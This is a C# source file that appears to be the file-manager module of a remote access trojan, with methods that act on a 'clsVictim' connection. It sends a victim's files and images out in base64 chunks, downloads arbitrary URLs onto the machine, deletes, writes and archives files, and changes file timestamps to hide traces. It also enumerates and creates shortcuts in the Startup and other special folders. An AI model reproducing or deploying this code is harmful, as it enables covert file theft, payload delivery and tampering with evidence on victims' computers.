using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO.Compression;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using System.Net;
using System.Threading;
using System.Security.Policy;

namespace winClient48
{
    public class FuncFile
    {
        public bool df_stop = false;

        public string cp; //CURRENT PATH
        public DriveInfo[] drivers;

        //Download
        public bool g_bDownloadFile { get; set; }
        public bool g_bDownloadPause { get; set; }

        public FuncFile()
        {
            cp = Application.StartupPath;
            drivers = DriveInfo.GetDrives();
        }

        public string BytesNormalize(long bytes_size)
        {
            if (bytes_size < 1024)
                return $"{bytes_size} Bytes";
            else if (bytes_size < 1024 * 1024)
                return $"{bytes_size / 1024.0:F2} KB";
            else if (bytes_size < 1024 * 1024 * 1024)
                return $"{bytes_size / (1024.0 * 1024):F2} MB";
            else if (bytes_size < 1024L * 1024 * 1024 * 1024)
                return $"{bytes_size / (1024.0 * 1024 * 1024):F2} GB";
            else
                return $"{bytes_size / (1024.0 * 1024 * 1024 * 1024):F2} TB";
        }

        public DriveInfo[] GetDrives()
        {
            return drivers;
        }
        public (int, string) Goto(string szDirPath)
        {
            int code = 1;
            string msg = string.Empty;

            try
            {
                if (!Directory.Exists(szDirPath))
                    throw new Exception($"Path not exists: " + szDirPath);

                msg = Path.GetFullPath(szDirPath);
            }
            catch (Exception ex)
            {
                code = 0;
                msg = ex.Message;
            }

            return (code, msg);
        }
        public (int, string, List<string[]>, List<string[]>) ScanDir(string path, int dir_limit, int file_limit)
        {
            List<string[]> l_dir = new List<string[]>();
            List<string[]> l_file = new List<string[]>();
            int code = 1;

            int dir_cnt = 0;
            int file_cnt = 0;

            try
            {
                foreach (string dir in Directory.GetDirectories(path))
                {
                    bool is_readonly = false;
                    bool is_writable = false;

                    string tmp_file = Path.Combine(dir, "tmp_" + Guid.NewGuid() + ".txt");

                    string path_check = Path.Combine(path, dir);
                    if (!Directory.Exists(path_check))
                        throw new Exception("Permission Denial.");

                    /*
                    try { File.Create(tmp_file).Close(); File.Delete(tmp_file); is_writable = true; } catch (Exception ex) { Console.WriteLine(ex.Message); }
                    try { Directory.GetFiles(dir); is_readonly = true; } catch { }
                    */

                    DirectoryInfo info = new DirectoryInfo(dir);
                    l_dir.Add(new string[]
                    {
                        dir, //DIR NAME
                        "X", //FILE LENGTH
                        "X", //READABLE, WRITABLE
                        //(is_readonly ? "R" : string.Empty) + (is_writable ? "W" : string.Empty),
                        info.Attributes.ToString(), //FOLDER ATTRIBUTE
                        info.CreationTime.ToString("F"), //FOLDER CREATION TIME
                        info.LastWriteTime.ToString("F"), //LAST WRITE TIME
                        info.LastAccessTime.ToString("F"), //LAST ACCESS TIME
                    });

                    if (dir_limit == -1)
                        continue;

                    dir_cnt++;
                    if (dir_cnt == dir_limit)
                        break;
                }

                foreach (string file in Directory.GetFiles(path))
                {
                    FileInfo info = new FileInfo(file);
                    FileAttributes attr = File.GetAttributes(file);
                    bool is_readonly = (attr & FileAttributes.ReadOnly) == FileAttributes.ReadOnly;

                    l_file.Add(new string[]
                    {
                        info.FullName, //FILE NAME
                        BytesNormalize(info.Length), //FILE LENGTH
                        is_readonly ? "R" : "RW", //READABLE
                        info.Attributes.ToString(), //FILE ATTRIBUTE
                        info.CreationTime.ToString("F"), //CREATION TIME
                        info.LastWriteTime.ToString("F"), //LAST WRITE TIME
                        info.LastAccessTime.ToString("F"), //LAST ACCESS TIME
                    });

                    if (file_limit == -1)
                        continue;

                    file_cnt++;
                    if (file_cnt == file_limit)
                        break;
                }

                return (code, string.Empty, l_dir, l_file);
            }
            catch (Exception ex)
            {
                code = 0;

                return (code, ex.Message, l_dir, l_file);
            }
        }
        public string DeleteItems(string[] d1, string[] d2)
        {
            List<string> l_folder = new List<string>();
            List<string> l_file = new List<string>();

            foreach (string folder in d1)
            {
                try { Directory.Delete(folder, true); l_folder.Add($"1;{clsCrypto.b64E2Str(folder)};"); }
                catch (Exception ex) { l_folder.Add($"0;{clsCrypto.b64E2Str(folder)};{clsCrypto.b64E2Str(ex.Message)}"); }
            }
            foreach (string file in d2)
            {
                try { File.Delete(file); l_file.Add($"1;{clsCrypto.b64E2Str(file)};"); }
                catch (Exception ex) { l_file.Add($"0;{clsCrypto.b64E2Str(file)};{clsCrypto.b64E2Str(ex.Message)}"); }
            }

            return $"{string.Join(",", l_folder)}|{string.Join(",", l_file.ToArray())}";
        }
        public string ReadFile(string dst)
        {
            string path = clsCrypto.b64D2Str(dst);
            try 
            { 
                return $"1|{dst}|{clsCrypto.b64E2Str(File.ReadAllText(path))}"; 
            }
            catch (Exception ex) 
            {
                return $"0|{dst}|{clsCrypto.b64E2Str(ex.Message)}"; 
            }
        }
        public string WriteFile(string file, string text)
        {
            try { File.WriteAllText(file, text); return "1|" + clsCrypto.b64E2Str(file) + "|"; }
            catch (Exception ex) { return $"0|{clsCrypto.b64E2Str(file)}|{clsCrypto.b64E2Str(ex.Message)}"; }
        }
        public string PasteItems(string[] folders, string[] files, string dir_dst, bool mv = false)
        {
            List<string> list = new List<string>();
            foreach (string folder in folders)
            {
                try
                {
                    string folder_dst = Path.Combine(dir_dst, Path.GetFileName(folder));
                    CopyDirectory(folder, dir_dst);
                    if (mv)
                        Directory.Delete(folder, true);
                    list.Add($"1|d|{clsCrypto.b64E2Str(folder)}|{clsCrypto.b64E2Str(folder_dst)}");
                }
                catch (Exception ex)
                {
                    list.Add($"0|d|{clsCrypto.b64E2Str(folder)}|{clsCrypto.b64E2Str(ex.Message)}");
                }
            }
            foreach (string file in files)
            {
                try
                {
                    string file_dst = Path.Combine(dir_dst, Path.GetFileName(file));
                    File.Copy(file, file_dst);
                    if (mv)
                        File.Delete(file);
                    list.Add($"1|f|{clsCrypto.b64E2Str(file)}|{clsCrypto.b64E2Str(file_dst)}");
                }
                catch (Exception ex)
                {
                    list.Add($"0|f|{clsCrypto.b64E2Str(file)}|{clsCrypto.b64E2Str(ex.Message)}");
                }
            }

            return string.Join(",", list.Select(x => clsCrypto.b64E2Str(x)).ToArray());
        }
        private void CopyDirectory(string dir_src, string dir_dst)
        {
            if (!Directory.Exists(dir_src))
                throw new Exception("");

            dir_dst = Path.Combine(dir_dst, Path.GetFileName(dir_src));
            if (!Directory.Exists(dir_dst))
                Directory.CreateDirectory(dir_dst);

            foreach (string file in Directory.GetFiles(dir_src))
            {
                string file_dst = Path.Combine(dir_dst, Path.GetFileName(file));
                File.Copy(file, file_dst);
            }

            foreach (string subdir in Directory.GetDirectories(dir_src))
            {
                string subdir_src = Path.Combine(dir_src, Path.GetFileName(subdir));
                CopyDirectory(subdir, dir_dst);
            }
        }
        public void Upload()
        {

        }
        public void Download(string[] files, clsVictim v)
        {
            int chunk_size = 1024 * 3;
            byte[] file_buffer = new byte[chunk_size];

            g_bDownloadPause = false;
            g_bDownloadFile = true;

            foreach (string file in files)
            {
                if (!g_bDownloadFile)
                {
                    v.SendCommand("file|df|stop");
                    return;
                }
                while (g_bDownloadPause)
                {
                    Thread.Sleep(1000);
                }

                string tgt_filename = file;
                FileInfo info = new FileInfo(file);
                long file_len = info.Length;

                int i = 0;
                int bytes_read;
                using (FileStream fs = new FileStream(file, FileMode.Open, FileAccess.Read))
                {
                    while ((bytes_read = fs.Read(file_buffer, 0, file_buffer.Length)) > 0)
                    {
                        if (!g_bDownloadFile)
                        {
                            v.SendCommand("file|df|stop");
                            return;
                        }
                        while (g_bDownloadPause)
                        {
                            Thread.Sleep(1000);
                        }

                        string b64_data = Convert.ToBase64String(file_buffer);
                        string szPayload = string.Join("|", new string[]
                        {
                            "file",
                            "df",
                            "recv",
                            clsCrypto.b64E2Str(tgt_filename), //TARGET FILE PATH
                            file_len.ToString(), //FILE LENGTH
                            (i * chunk_size).ToString(), //OFFSET
                            b64_data, //BASE64 FILE DATA
                        });

                        v.SendCommand(szPayload);
                        i++;

                        Thread.Sleep(10);
                    }
                }
            }
        }

        public (int, string, string) Wget(clsVictim v, string url, string szCurrentDir)
        {
            int code = 1;
            string msg = string.Empty;
            string szSaveFileName = string.Empty;

            try
            {
                using (WebClient clnt = new WebClient())
                {
                    WebRequest req = WebRequest.Create(url);
                    using (WebResponse resp = req.GetResponse())
                    {
                        DateTime dt = DateTime.Now;
                        string szFileName = string.Join(string.Empty, new int[] { dt.Year, dt.Month, dt.Day, dt.Hour, dt.Minute, dt.Second, dt.Millisecond }.Select(x => x.ToString()));
                        string szContentDispo = resp.Headers["Content-Disposition"];
                        if (!string.IsNullOrEmpty(szContentDispo))
                        {
                            string szKey = "filename=";
                            int idx = szContentDispo.IndexOf(szKey, StringComparison.OrdinalIgnoreCase);
                            if (idx >= 0)
                            {
                                szFileName = szContentDispo.Substring(idx, szKey.Length).Trim('\"');
                            }
                        }

                        string szSavePath = Path.Combine(szCurrentDir, szFileName);

                        clnt.DownloadProgressChanged += (s, e) =>
                        {
                            v.SendCommand($"file|wget|progress|{clsCrypto.b64E2Str(url)}|{clsCrypto.b64E2Str(szSavePath)}|{e.ProgressPercentage}|{e.BytesReceived}/{e.TotalBytesToReceive}");
                        };

                        clnt.DownloadFile(url, szSavePath);

                        msg = "OK";
                        szSaveFileName = szSavePath;
                    }
                }
            }
            catch (Exception ex)
            {
                msg = ex.Message;
                code = 0;
            }

            return (code, msg, szSaveFileName);
        }

        public List<string> ShowImage(clsVictim v, string data)
        {
            List<string> b64_imgs = new List<string>();
            try
            {
                foreach (string enc_file in data.Split(','))
                {
                    string filename = clsCrypto.b64D2Str(enc_file);
                    Bitmap img = (Bitmap)Image.FromFile(filename);
                    string b64_data = Global.BitmapToBase64(img);
                    v.SendCommand($"file|img|{enc_file};{b64_data}");
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }

            return b64_imgs;
        }

        public (List<string[]>, List<string[]>) Archive_Compress(string[] folders, string[] files, string archive_path)
        {
            List<string[]> infoFolder = new List<string[]>();
            List<string[]> infoFile = new List<string[]>();

            try
            {
                using (FileStream zip = new FileStream(archive_path, FileMode.Create))
                {
                    using (ZipArchive archive = new ZipArchive(zip, ZipArchiveMode.Create))
                    {
                        //Recurrence Function (Add Folder into Archive)
                        void FolderRecurrence(ZipArchive recuArchive, string folder, string baseDir)
                        {
                            foreach (string dir in Directory.GetDirectories(folder))
                            {
                                FolderRecurrence(recuArchive, dir, baseDir);
                            }

                            foreach (string file in Directory.GetFiles(folder))
                            {
                                //recuArchive.CreateEntry(file.Replace(baseDir, string.Empty));
                                recuArchive.CreateEntryFromFile(file, file.Replace(baseDir, string.Empty));
                            }
                        }

                        foreach (string folder in folders)
                        {
                            if (string.IsNullOrEmpty(folder))
                                continue;

                            if (!Directory.Exists(folder))
                            {
                                infoFolder.Add(new string[]
                                {
                                        folder, //Path
                                        "Not Found" //State
                                });
                                continue;
                            }

                            string baseDir = Path.GetDirectoryName(folder.Substring(0, folder.Length - 1));
                            FolderRecurrence(archive, folder, baseDir);
                            infoFolder.Add(new string[]
                            {
                                    folder,
                                    "OK"
                            });
                        }

                        //Add File into Archive
                        foreach (string file in files)
                        {
                            if (string.IsNullOrEmpty(file))
                                continue;

                            if (!File.Exists(file))
                            {
                                infoFile.Add(new string[]
                                {
                                        file,
                                        "Not Found"
                                });
                                continue;
                            }

                            string entryName = Path.GetFileName(file);
                            archive.CreateEntryFromFile(file, entryName);
                            infoFile.Add(new string[]
                            {
                                    file,
                                    "OK"
                            });
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }

            return (infoFolder, infoFile);
        }
        public List<string[]> Archive_Extract(string[] archives, string dstDir, int method, bool delete = false)
        {
            void ExtractZip(string archivePath, string destDir)
            {
                using (ZipArchive zipArchive = ZipFile.OpenRead(archivePath))
                {
                    foreach (ZipArchiveEntry entry in zipArchive.Entries)
                    {
                        string destPath = entry.FullName[0] == '\\' ? destDir + entry.FullName : destDir + "\\" + entry.FullName;

                        if (!destPath.StartsWith(destDir, StringComparison.OrdinalIgnoreCase))
                            continue;

                        string destPathDir = Path.GetDirectoryName(destPath);
                        if (!Directory.Exists(destPathDir))
                            Directory.CreateDirectory(destPathDir);

                        try
                        {
                            entry.ExtractToFile(destPath);
                        }
                        catch (Exception ex)
                        {
                            MessageBox.Show(ex.Message);
                        }
                    }
                }
            }

            List<string[]> aInfo = new List<string[]>();

            try
            {
                foreach (string archive in archives)
                {
                    if (string.IsNullOrEmpty(archive))
                        continue;

                    if (!File.Exists(archive))
                    {
                        aInfo.Add(new string[]
                        {
                                archive ,
                                "Not Found"
                        });
                        continue;
                    }

                    try
                    {
                        switch (method)
                        {
                            case 0: //Each to Seperate Folder
                                string dirName = Path.GetFileNameWithoutExtension(archive);
                                dirName = Path.Combine(
                                    Path.GetDirectoryName(archive),
                                    Path.GetFileNameWithoutExtension(archive)
                                );
                                if (!Directory.Exists(dirName))
                                    Directory.CreateDirectory(dirName);
                                //ZipFile.ExtractToDirectory(archive, dirName);
                                ExtractZip(archive, dirName);
                                break;
                            case 1: //Extract to Specific Folder
                                if (!Directory.Exists(dstDir))
                                    Directory.CreateDirectory(dstDir);
                                ZipFile.ExtractToDirectory(archive, dstDir);
                                break;
                            case 2: //Extract Here
                                ZipFile.ExtractToDirectory(archive, Path.GetDirectoryName(archive));
                                break;
                        }

                        if (delete)
                            File.Delete(archive);

                        aInfo.Add(new string[]
                        {
                                archive,
                                "OK"
                        });
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                        aInfo.Add(new string[]
                        {
                                archive,
                                ex.Message,
                        });
                    }
                }
            }
            catch (Exception ex)
            {

            }

            return aInfo;
        }
        public List<string> ScanShortCut()
        {
            List<string> folders = new List<string>();
            Environment.SpecialFolder[] special_folders =
            {
                    Environment.SpecialFolder.ApplicationData,
                    Environment.SpecialFolder.Desktop,
                    Environment.SpecialFolder.Personal,
                    Environment.SpecialFolder.AdminTools,
                    Environment.SpecialFolder.StartMenu,
                    Environment.SpecialFolder.Startup,
                    Environment.SpecialFolder.System,
                    Environment.SpecialFolder.Templates,
                    Environment.SpecialFolder.UserProfile,
                    Environment.SpecialFolder.Windows,
                };
            foreach (var s in special_folders)
            {
                try
                {
                    string folder = Environment.GetFolderPath(s);
                    foreach (DriveInfo driver in DriveInfo.GetDrives())
                    {
                        string driverName = driver.Name.Replace("\\", string.Empty).Replace(":", string.Empty);
                        folder = string.Join(":", new string[] { driverName, folder.Split(':')[1] });
                        if (Directory.Exists(folder))
                            folders.Add(folder);
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }

            return folders;
        }
        public List<string> FileMgrInfo()
        {
            List<string> result = new List<string>();
            foreach (DriveInfo dInfo in DriveInfo.GetDrives())
            {
                if (dInfo.IsReady)
                {
                    result.Add($"{dInfo.Name};FreeSpace: {BytesNormalize(dInfo.TotalFreeSpace)}/{BytesNormalize(dInfo.TotalSize)}");
                }
            }

            return result;
        }
        public List<(string, string)> Find(string[] paths, string[] patterns, int method, bool ignoreCase, int itemType)
        {
            //Method: 0: File/Folder Name Only, 1: FullPath
            //ItemType: 0: Folder, 1: File, 2: All

            string InputProcess(string fullPath)
            {
                switch (method)
                {
                    case 0: //Name Only
                        return Path.GetFileName(fullPath);
                    case 1: //FullPath
                        return fullPath;
                    default:
                        return null;
                }
            }

            List<(string, string)> results = new List<(string, string)>();
            foreach (string path in paths)
            {
                if (!Directory.Exists(path))
                    continue;

                if (itemType == 0 || itemType == 2)
                {
                    foreach (string folderPath in Directory.GetDirectories(path))
                    {
                        string input = InputProcess(folderPath);
                        foreach (string pattern in patterns)
                        {
                            if (Regex.IsMatch(input, @pattern, ignoreCase ? RegexOptions.IgnoreCase : RegexOptions.None))
                                results.Add(("d", folderPath));
                        }

                        //Recurrence
                        results.AddRange(Find(new string[] { folderPath }, patterns, method, ignoreCase, itemType));
                    }
                }

                if (itemType == 1 || itemType == 2)
                {
                    foreach (string filePath in Directory.GetFiles(path))
                    {
                        string input = InputProcess(filePath);
                        foreach (string pattern in patterns)
                        {
                            if (Regex.IsMatch(input, @pattern, ignoreCase ? RegexOptions.IgnoreCase : RegexOptions.None))
                                results.Add(("f", filePath));
                        }
                    }
                }
            }

            return results;
        }

        public (int nCode, string szMsg) fnSetEntityTimestamp(bool bIsFile, string szEntityPath, EntityTimestampType etType, DateTime date)
        {
            int nCode = 0;
            string szMsg = string.Empty;

            try
            {
                switch (etType)
                {
                    case EntityTimestampType.CreationTime:
                        if (bIsFile)
                            File.SetCreationTime(szEntityPath, date);
                        else
                            Directory.SetCreationTime(szEntityPath, date);
                        break;
                    case EntityTimestampType.LastModifiedTime:
                        if (bIsFile)
                            File.SetLastWriteTime(szEntityPath, date);
                        else
                            Directory.SetLastWriteTime(szEntityPath, date);
                        break;
                    case EntityTimestampType.LastAccessedTime:
                        if (bIsFile)
                            File.SetLastAccessTime(szEntityPath, date);
                        else
                            Directory.SetLastAccessTime(szEntityPath, date);
                        break;
                }

                nCode = 1;
            }
            catch (Exception ex)
            {
                szMsg = ex.Message;
            }

            return (nCode, szMsg);
        }

        public (int nCode, string szMsg) fnCreateShortCuts(ShortCutsType scType, string szSrc, string szDestPath, string szDescription)
        {
            int nCode = 0;
            string szMsg = string.Empty;

            try
            {
                //Validate
                if (File.Exists(szDestPath))
                    throw new Exception("ShortCut exists: " + szDestPath);
                if (!File.Exists(szSrc) && !Directory.Exists(szSrc))
                    throw new Exception("Target not found: " + szSrc);

                //Process
                switch (scType)
                {
                    case ShortCutsType.File:
                        var shell = new IWshRuntimeLibrary.WshShell();
                        IWshRuntimeLibrary.IWshShortcut sc = (IWshRuntimeLibrary.IWshShortcut)shell.CreateShortcut(szDestPath);
                        sc.TargetPath = szSrc;
                        sc.Description = szDescription;
                        sc.WorkingDirectory = Path.GetDirectoryName(szSrc);

                        sc.Save();

                        break;

                    case ShortCutsType.URL:
                        using (StreamWriter sw = new StreamWriter(szDestPath))
                        {
                            sw.WriteLine("[InternetShortcut]");
                            sw.WriteLine("URL=" + szSrc);
                        }

                        break;
                }

                nCode = 1;
            }
            catch (Exception ex)
            {
                szMsg = ex.Message;
            }

            return (nCode, szMsg);
        }
    }
}
